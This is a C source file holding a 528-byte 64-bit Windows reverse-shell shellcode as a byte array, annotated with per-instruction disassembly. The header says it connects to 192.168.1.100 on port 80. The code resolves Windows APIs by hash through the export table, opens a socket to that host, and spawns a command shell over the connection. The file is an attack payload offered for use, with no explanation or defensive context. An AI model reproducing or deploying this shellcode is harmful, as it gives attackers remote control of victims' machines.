// Generated on 09/09/14 at 11:19:36

// Description     : 64-Bit Reverse shell using Export Address Table
// TCP Address     : 192.168.1.100:80
// Hash algorithm  : ADD/ROL
// Code size       : 528 bytes

#define API_DATA 0x2D  // offset to API/DLL
#define PORT_NBR 0x1E8 // offset to port number
#define IP_ADDR  0x1E4 // offset to IP address

/* Size = 528 bytes */

char revbind[] = {
  /***********************************************************************************************/
  /* 0000 */  "\x53"                                      /*  push rbx                           */
  /* 0001 */  "\x56"                                      /*  push rsi                           */
  /* 0002 */  "\x57"                                      /*  push rdi                           */
  /* 0003 */  "\x55"                                      /*  push rbp                           */
  /* 0004 */  "\x41\x54"                                  /*  push r12                           */
  /* 0006 */  "\x41\x55"                                  /*  push r13                           */
  /* 0008 */  "\x41\x56"                                  /*  push r14                           */
  /* 000A */  "\x41\x57"                                  /*  push r15                           */
  /* 000C */  "\xEB\x1A"                                  /*  jmp 00000028h                      */
  /* 000E */  "\x5E"                                      /*  pop rsi                            */
  /* 000F */  "\x33\xC0"                                  /*  xor eax, eax                       */
  /* 0011 */  "\x99"                                      /*  cdq                                */
  /* 0012 */  "\xB2\x3E"                                  /*  mov dl, 3Eh                        */
  /* 0014 */  "\xB6\x01"                                  /*  mov dh, 01h                        */
  /* 0016 */  "\x48\x03\xD6"                              /*  add rdx, rsi                       */
  /* 0019 */  "\xFF\xD2"                                  /*  call rdx                           */
  /* 001B */  "\x41\x5F"                                  /*  pop r15                            */
  /* 001D */  "\x41\x5E"                                  /*  pop r14                            */
  /* 001F */  "\x41\x5D"                                  /*  pop r13                            */
  /* 0021 */  "\x41\x5C"                                  /*  pop r12                            */
  /* 0023 */  "\x5D"                                      /*  pop rbp                            */
  /* 0024 */  "\x5F"                                      /*  pop rdi                            */
  /* 0025 */  "\x5E"                                      /*  pop rsi                            */
  /* 0026 */  "\x5B"                                      /*  pop rbx                            */
  /* 0027 */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 0028 */  "\xE8\xE1\xFF\xFF\xFF"                      /*  call 0000000Eh                     */
  /* 002D */  "\x04\x5E"                                  /*  add al, 5Eh                        */
  /* 002F */  "\x83\xAF\x7F\xA9\x4E\x17\x53"              /*  sub dword ptr [rdi+174EA97Fh], 53h */
  /* 0036 */  "\x2D\x80\x55\xC7\xC9"                      /*  sub eax, C9C75580h                 */
  /* 003B */  "\x5E"                                      /*  pop rsi                            */
  /* 003C */  "\xCC"                                      /*  int3                               */
  /* 003D */  "\x36\x04\x37"                              /*  add al, 37h                        */
  /* 0040 */  "\x9D"                                      /*  popfq                              */
  /* 0041 */  "\x90"                                      /*  nop                                */
  /* 0042 */  "\x0E"                                      /*  ???                                */
  /* 0043 */  "\x44\xBC\x53\x86\x8A\x29"                  /*  mov esp, 298A8653h                 */
  /* 0049 */  "\x5E"                                      /*  pop rsi                            */
  /* 004A */  "\xB5\x4E"                                  /*  mov ch, 4Eh                        */
  /* 004C */  "\xFF\x88\x82\x56\x52\x50"                  /*  dec dword ptr [rax+50525682h]      */
  /* 0052 */  "\x5E"                                      /*  pop rsi                            */
  /* 0053 */  "\x33\xC0"                                  /*  xor eax, eax                       */
  /* 0055 */  "\x99"                                      /*  cdq                                */
  /* 0056 */  "\xAC"                                      /*  lodsb                              */
  /* 0057 */  "\x03\xD0"                                  /*  add edx, eax                       */
  /* 0059 */  "\xC1\xC2\x09"                              /*  rol edx, 09h                       */
  /* 005C */  "\xFF\xC8"                                  /*  dec eax                            */
  /* 005E */  "\x79\xF6"                                  /*  jns 00000056h                      */
  /* 0060 */  "\x92"                                      /*  xchg eax, edx                      */
  /* 0061 */  "\x5A"                                      /*  pop rdx                            */
  /* 0062 */  "\x5E"                                      /*  pop rsi                            */
  /* 0063 */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 0064 */  "\x56"                                      /*  push rsi                           */
  /* 0065 */  "\x53"                                      /*  push rbx                           */
  /* 0066 */  "\x57"                                      /*  push rdi                           */
  /* 0067 */  "\x51"                                      /*  push rcx                           */
  /* 0068 */  "\x8B\x43\x3C"                              /*  mov eax, dword ptr [rbx+3Ch]       */
  /* 006B */  "\x83\xC0\x10"                              /*  add eax, 10h                       */
  /* 006E */  "\x8B\x4C\x18\x78"                          /*  mov ecx, dword ptr [rax+rbx+78h]   */
  /* 0072 */  "\x67\xE3\x39"                              /*  jecxz 000000AEh                    */
  /* 0075 */  "\x48\x8D\x74\x19\x18"                      /*  lea rsi, qword ptr [rcx+rbx+18h]   */
  /* 007A */  "\x6A\x04"                                  /*  push 00000004h                     */
  /* 007C */  "\x59"                                      /*  pop rcx                            */
  /* 007D */  "\xAD"                                      /*  lodsd                              */
  /* 007E */  "\x48\x03\xC3"                              /*  add rax, rbx                       */
  /* 0081 */  "\x50"                                      /*  push rax                           */
  /* 0082 */  "\xE2\xF9"                                  /*  loop 0000007Dh                     */
  /* 0084 */  "\x5F"                                      /*  pop rdi                            */
  /* 0085 */  "\x5A"                                      /*  pop rdx                            */
  /* 0086 */  "\x5E"                                      /*  pop rsi                            */
  /* 0087 */  "\x59"                                      /*  pop rcx                            */
  /* 0088 */  "\x48\x2B\xCB"                              /*  sub rcx, rbx                       */
  /* 008B */  "\x74\x21"                                  /*  je 000000AEh                       */
  /* 008D */  "\x8B\x44\x8A\xFC"                          /*  mov eax, dword ptr [rdx+rcx*4-04h] */
  /* 0091 */  "\x48\x03\xC3"                              /*  add rax, rbx                       */
  /* 0094 */  "\xE8\xB6\xFF\xFF\xFF"                      /*  call 0000004Fh                     */
  /* 0099 */  "\x41\x3B\xC0"                              /*  cmp eax, r8d                       */
  /* 009C */  "\xE0\xEF"                                  /*  loopne 0000008Dh                   */
  /* 009E */  "\x75\x0E"                                  /*  jne 000000AEh                      */
  /* 00A0 */  "\x48\x93"                                  /*  xchg rax, rbx                      */
  /* 00A2 */  "\x48\x91"                                  /*  xchg rax, rcx                      */
  /* 00A4 */  "\x0F\xB7\x04\x47"                          /*  movzx eax, word ptr [rdi+rax*2]    */
  /* 00A8 */  "\x8B\x04\x86"                              /*  mov eax, dword ptr [rsi+rax*4]     */
  /* 00AB */  "\x48\x03\xC8"                              /*  add rcx, rax                       */
  /* 00AE */  "\x48\x8B\xC1"                              /*  mov rax, rcx                       */
  /* 00B1 */  "\x59"                                      /*  pop rcx                            */
  /* 00B2 */  "\x5F"                                      /*  pop rdi                            */
  /* 00B3 */  "\x5B"                                      /*  pop rbx                            */
  /* 00B4 */  "\x5E"                                      /*  pop rsi                            */
  /* 00B5 */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 00B6 */  "\x53"                                      /*  push rbx                           */
  /* 00B7 */  "\x57"                                      /*  push rdi                           */
  /* 00B8 */  "\x44\x8B\xC0"                              /*  mov r8d, eax                       */
  /* 00BB */  "\x6A\x60"                                  /*  push 00000060h                     */
  /* 00BD */  "\x5B"                                      /*  pop rbx                            */
  /* 00BE */  "\x65\x48\x8B\x03"                          /*  mov rax, qword ptr [rbx]           */
  /* 00C2 */  "\x48\x8B\x40\x18"                          /*  mov rax, qword ptr [rax+18h]       */
  /* 00C6 */  "\x48\x8B\x78\x30"                          /*  mov rdi, qword ptr [rax+30h]       */
  /* 00CA */  "\xEB\x0D"                                  /*  jmp 000000D9h                      */
  /* 00CC */  "\xE8\x93\xFF\xFF\xFF"                      /*  call 00000064h                     */
  /* 00D1 */  "\x48\x85\xC0"                              /*  test rax, rax                      */
  /* 00D4 */  "\x75\x0D"                                  /*  jne 000000E3h                      */
  /* 00D6 */  "\x48\x8B\x3F"                              /*  mov rdi, qword ptr [rdi]           */
  /* 00D9 */  "\x48\x8B\x5F\x10"                          /*  mov rbx, qword ptr [rdi+10h]       */
  /* 00DD */  "\x48\x85\xDB"                              /*  test rbx, rbx                      */
  /* 00E0 */  "\x75\xEA"                                  /*  jne 000000CCh                      */
  /* 00E2 */  "\x93"                                      /*  xchg eax, ebx                      */
  /* 00E3 */  "\x5F"                                      /*  pop rdi                            */
  /* 00E4 */  "\x5B"                                      /*  pop rbx                            */
  /* 00E5 */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 00E6 */  "\x33\xC0"                                  /*  xor eax, eax                       */
  /* 00E8 */  "\xAC"                                      /*  lodsb                              */
  /* 00E9 */  "\x91"                                      /*  xchg eax, ecx                      */
  /* 00EA */  "\xAD"                                      /*  lodsd                              */
  /* 00EB */  "\xE8\xC6\xFF\xFF\xFF"                      /*  call 000000B6h                     */
  /* 00F0 */  "\x85\xC0"                                  /*  test eax, eax                      */
  /* 00F2 */  "\x74\x04"                                  /*  je 000000F8h                       */
  /* 00F4 */  "\x48\xAB"                                  /*  stosq                              */
  /* 00F6 */  "\xE2\xF2"                                  /*  loop 000000EAh                     */
  /* 00F8 */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 00F9 */  "\x50"                                      /*  push rax                           */
  /* 00FA */  "\x55"                                      /*  push rbp                           */
  /* 00FB */  "\x48\x83\xC4\xA8"                          /*  add rsp, FFFFFFFFFFFFFFA8h         */
  /* 00FF */  "\x48\x8D\x7B\x20"                          /*  lea rdi, qword ptr [rbx+20h]       */
  /* 0103 */  "\x99"                                      /*  cdq                                */
  /* 0104 */  "\xB2\x68"                                  /*  mov dl, 68h                        */
  /* 0106 */  "\x89\x17"                                  /*  mov dword ptr [rdi], edx           */
  /* 0108 */  "\xFF\x47\x3D"                              /*  inc dword ptr [rdi+3Dh]            */
  /* 010B */  "\x48\x8D\x7F\x50"                          /*  lea rdi, qword ptr [rdi+50h]       */
  /* 010F */  "\x48\xAB"                                  /*  stosq                              */
  /* 0111 */  "\x48\xAB"                                  /*  stosq                              */
  /* 0113 */  "\x48\xAB"                                  /*  stosq                              */
  /* 0115 */  "\x95"                                      /*  xchg eax, ebp                      */
  /* 0116 */  "\xB8\x9C\x92\x9B\xFF"                      /*  mov eax, FF9B929Ch                 */
  /* 011B */  "\xF7\xD0"                                  /*  not eax                            */
  /* 011D */  "\x48\x89\x03"                              /*  mov qword ptr [rbx], rax           */
  /* 0120 */  "\x48\x8D\x7C\x24\x20"                      /*  lea rdi, qword ptr [rsp+20h]       */
  /* 0125 */  "\x48\xAB"                                  /*  stosq                              */
  /* 0127 */  "\xB8\xFF\xFF\xFF\xF7"                      /*  mov eax, F7FFFFFFh                 */
  /* 012C */  "\xF7\xD0"                                  /*  not eax                            */
  /* 012E */  "\x48\xAB"                                  /*  stosq                              */
  /* 0130 */  "\x33\xC0"                                  /*  xor eax, eax                       */
  /* 0132 */  "\x48\xAB"                                  /*  stosq                              */
  /* 0134 */  "\x48\xAB"                                  /*  stosq                              */
  /* 0136 */  "\x91"                                      /*  xchg eax, ecx                      */
  /* 0137 */  "\x48\x8D\x43\x20"                          /*  lea rax, qword ptr [rbx+20h]       */
  /* 013B */  "\x48\xAB"                                  /*  stosq                              */
  /* 013D */  "\x48\xAB"                                  /*  stosq                              */
  /* 013F */  "\x4D\x33\xC9"                              /*  xor r9, r9                         */
  /* 0142 */  "\x4D\x33\xC0"                              /*  xor r8, r8                         */
  /* 0145 */  "\x53"                                      /*  push rbx                           */
  /* 0146 */  "\x5A"                                      /*  pop rdx                            */
  /* 0147 */  "\xFF\x53\xC8"                              /*  call qword ptr [rbx-38h]           */
  /* 014A */  "\xF7\xD8"                                  /*  neg eax                            */
  /* 014C */  "\x79\x16"                                  /*  jns 00000164h                      */
  /* 014E */  "\x92"                                      /*  xchg eax, edx                      */
  /* 014F */  "\x48\x8B\x4B\x20"                          /*  mov rcx, qword ptr [rbx+20h]       */
  /* 0153 */  "\xFF\x53\xD0"                              /*  call qword ptr [rbx-30h]           */
  /* 0156 */  "\x48\x8B\x4B\x28"                          /*  mov rcx, qword ptr [rbx+28h]       */
  /* 015A */  "\xFF\x53\xD8"                              /*  call qword ptr [rbx-28h]           */
  /* 015D */  "\x48\x8B\x4B\x20"                          /*  mov rcx, qword ptr [rbx+20h]       */
  /* 0161 */  "\xFF\x53\xD8"                              /*  call qword ptr [rbx-28h]           */
  /* 0164 */  "\x48\x83\xEC\xA8"                          /*  sub rsp, FFFFFFFFFFFFFFA8h         */
  /* 0168 */  "\x5D"                                      /*  pop rbp                            */
  /* 0169 */  "\x58"                                      /*  pop rax                            */
  /* 016A */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
  /* 016B */  "\x4C\x8B\xFC"                              /*  mov r15, rsp                       */
  /* 016E */  "\x48\x83\xE4\xF0"                          /*  and rsp, FFFFFFFFFFFFFFF0h         */
  /* 0172 */  "\xB9\x28\xFF\xFF\xFF"                      /*  mov ecx, FFFFFF28h                 */
  /* 0177 */  "\xF7\xD9"                                  /*  neg ecx                            */
  /* 0179 */  "\x48\x2B\xE1"                              /*  sub rsp, rcx                       */
  /* 017C */  "\x54"                                      /*  push rsp                           */
  /* 017D */  "\x5F"                                      /*  pop rdi                            */
  /* 017E */  "\xF3\xAA"                                  /*  rep stosb                          */
  /* 0180 */  "\x54"                                      /*  push rsp                           */
  /* 0181 */  "\x5F"                                      /*  pop rdi                            */
  /* 0182 */  "\x48\x83\xC4\xC8"                          /*  add rsp, FFFFFFFFFFFFFFC8h         */
  /* 0186 */  "\xE8\x5B\xFF\xFF\xFF"                      /*  call 000000E6h                     */
  /* 018B */  "\x74\x7F"                                  /*  je 0000020Ch                       */
  /* 018D */  "\x48\xBA\x88\x8C\xCD\xA0\xCC\xCD\xFF\xFF"  /*  mov rdx, FFFFCDCCA0CD8C88h         */
  /* 0197 */  "\x48\xF7\xD2"                              /*  not rdx                            */
  /* 019A */  "\x48\x89\x17"                              /*  mov qword ptr [rdi], rdx           */
  /* 019D */  "\x48\x89\x4F\x08"                          /*  mov qword ptr [rdi+08h], rcx       */
  /* 01A1 */  "\x57"                                      /*  push rdi                           */
  /* 01A2 */  "\x59"                                      /*  pop rcx                            */
  /* 01A3 */  "\xFF\x57\xE0"                              /*  call qword ptr [rdi-20h]           */
  /* 01A6 */  "\x48\x85\xC0"                              /*  test rax, rax                      */
  /* 01A9 */  "\x74\x61"                                  /*  je 0000020Ch                       */
  /* 01AB */  "\xE8\x36\xFF\xFF\xFF"                      /*  call 000000E6h                     */
  /* 01B0 */  "\x74\x5A"                                  /*  je 0000020Ch                       */
  /* 01B2 */  "\x57"                                      /*  push rdi                           */
  /* 01B3 */  "\x5B"                                      /*  pop rbx                            */
  /* 01B4 */  "\x53"                                      /*  push rbx                           */
  /* 01B5 */  "\x5A"                                      /*  pop rdx                            */
  /* 01B6 */  "\xB1\x02"                                  /*  mov cl, 02h                        */
  /* 01B8 */  "\xFF\x53\xE0"                              /*  call qword ptr [rbx-20h]           */
  /* 01BB */  "\x85\xC0"                                  /*  test eax, eax                      */
  /* 01BD */  "\x75\x4D"                                  /*  jne 0000020Ch                      */
  /* 01BF */  "\x57"                                      /*  push rdi                           */
  /* 01C0 */  "\x5B"                                      /*  pop rbx                            */
  /* 01C1 */  "\x48\x89\x44\x24\x20"                      /*  mov qword ptr [rsp+20h], rax       */
  /* 01C6 */  "\x48\x89\x44\x24\x28"                      /*  mov qword ptr [rsp+28h], rax       */
  /* 01CB */  "\x4D\x33\xC9"                              /*  xor r9, r9                         */
  /* 01CE */  "\x4D\x33\xC0"                              /*  xor r8, r8                         */
  /* 01D1 */  "\x99"                                      /*  cdq                                */
  /* 01D2 */  "\xFF\xC2"                                  /*  inc edx                            */
  /* 01D4 */  "\x6A\x02"                                  /*  push 00000002h                     */
  /* 01D6 */  "\x59"                                      /*  pop rcx                            */
  /* 01D7 */  "\xFF\x53\xE8"                              /*  call qword ptr [rbx-18h]           */
  /* 01DA */  "\x8B\xE8"                                  /*  mov ebp, eax                       */
  /* 01DC */  "\xFF\xC0"                                  /*  inc eax                            */
  /* 01DE */  "\x74\x2C"                                  /*  je 0000020Ch                       */
  /* 01E0 */  "\x53"                                      /*  push rbx                           */
  /* 01E1 */  "\x5F"                                      /*  pop rdi                            */
  /* 01E2 */  "\x48\xB8\xFD\xFF\xFF\xAF\x3F\x57\xFE\x9B"  /*  mov rax, 9BFE573FAFFFFFFDh         */
  /* 01EC */  "\x48\xF7\xD0"                              /*  not rax                            */
  /* 01EF */  "\x48\xAB"                                  /*  stosq                              */
  /* 01F1 */  "\x6A\x10"                                  /*  push 00000010h                     */
  /* 01F3 */  "\x41\x58"                                  /*  pop r8                             */
  /* 01F5 */  "\x53"                                      /*  push rbx                           */
  /* 01F6 */  "\x5A"                                      /*  pop rdx                            */
  /* 01F7 */  "\x55"                                      /*  push rbp                           */
  /* 01F8 */  "\x59"                                      /*  pop rcx                            */
  /* 01F9 */  "\xFF\x53\xF0"                              /*  call qword ptr [rbx-10h]           */
  /* 01FC */  "\x85\xC0"                                  /*  test eax, eax                      */
  /* 01FE */  "\x75\x07"                                  /*  jne 00000207h                      */
  /* 0200 */  "\x8B\xC5"                                  /*  mov eax, ebp                       */
  /* 0202 */  "\xE8\xF2\xFE\xFF\xFF"                      /*  call 000000F9h                     */
  /* 0207 */  "\x55"                                      /*  push rbp                           */
  /* 0208 */  "\x59"                                      /*  pop rcx                            */
  /* 0209 */  "\xFF\x53\xF8"                              /*  call qword ptr [rbx-08h]           */
  /* 020C */  "\x49\x8B\xE7"                              /*  mov rsp, r15                       */
  /* 020F */  "\xC3"                                      /*  ret                                */
  /***********************************************************************************************/
};
